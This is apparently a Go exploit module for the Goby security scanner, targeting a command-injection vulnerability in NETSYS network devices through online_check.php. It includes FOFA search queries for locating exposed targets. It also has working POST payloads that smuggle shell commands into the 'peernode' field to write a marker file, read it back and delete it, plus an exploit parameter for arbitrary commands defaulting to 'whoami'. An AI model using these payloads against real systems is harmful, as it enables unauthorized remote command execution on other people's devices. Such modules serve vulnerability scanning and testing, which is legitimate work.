package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Netsys online_check.php file RCE",
    "Description": "<p>Founded in 2004, Shenzhen Wangyu Technology Co., Ltd. is a national high-tech enterprise specializing in the research and development, production, sales and service of products in the field of network information security. A command execution vulnerability exists in NETSYS of Shenzhen Network Domain Technology Co., Ltd. An attacker could exploit the vulnerability to execute arbitrary system commands.</p>",
    "Impact": "<p>Netsys online_check.php RCE</p>",
    "Recommendation": "<p>Follow the manufacturer's homepage for timely updates: <a href=\"http://www.netsys.cn/\">http://www.netsys.cn/</a></p>",
    "Product": "Netsys",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Netsys online_check.php 文件命令执行漏洞",
            "Product": "Netsys",
            "Description": "<p>深圳市网域科技技术有限公司成立于 2004 年，是一家专业从事网络信息安全领域产品的研发、生产、销售及服务的国家高新技术企业。深圳市网域科技技术有限公司 NETSYS 存在命令执行漏洞。攻击者可利用漏洞执行任意系统命令。</p>",
            "Recommendation": "<p>请关注厂商主页及时更新：<a href=\"http://www.netsys.cn/\">http://www.netsys.cn/</a></p>",
            "Impact": "<p>深圳市网域科技技术有限公司 NETSYS 存在命令执行漏洞。攻击者可利用漏洞执行任意系统命令。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Netsys online_check.php file RCE",
            "Product": "Netsys",
            "Description": "<p>Founded in 2004, Shenzhen Wangyu Technology Co., Ltd. is a national high-tech enterprise specializing in the research and development, production, sales and service of products in the field of network information security. A command execution vulnerability exists in NETSYS of Shenzhen Network Domain Technology Co., Ltd. An attacker could exploit the vulnerability to execute arbitrary system commands.</p>",
            "Recommendation": "<p>Follow the manufacturer's homepage for timely updates: <a href=\"http://www.netsys.cn/\">http://www.netsys.cn/</a></p>",
            "Impact": "<p>Netsys online_check.php RCE</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"NETSYS\" || title=\"OLYM\"",
    "GobyQuery": "title=\"NETSYS\" || title=\"OLYM\"",
    "Author": "tardc",
    "Homepage": "http://www.netsys.cn/",
    "DisclosureDate": "2022-04-06",
    "References": [
        "http://www.netsys.cn/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/view/vpn/autovpn/online_check.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "peernode=1;echo+sectest>/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/view/systemConfig/systemTool/ping/sectest",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": "sectest"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/view/vpn/autovpn/online_check.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "peernode=1;rm+/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/view/vpn/autovpn/online_check.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "peernode=1;echo+sectest>/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/view/systemConfig/systemTool/ping/sectest",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": "sectest"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/view/vpn/autovpn/online_check.php",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "peernode=1;rm+/tmp/www/html/view/systemConfig/systemTool/ping/sectest+#"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "Netsys"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10368"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
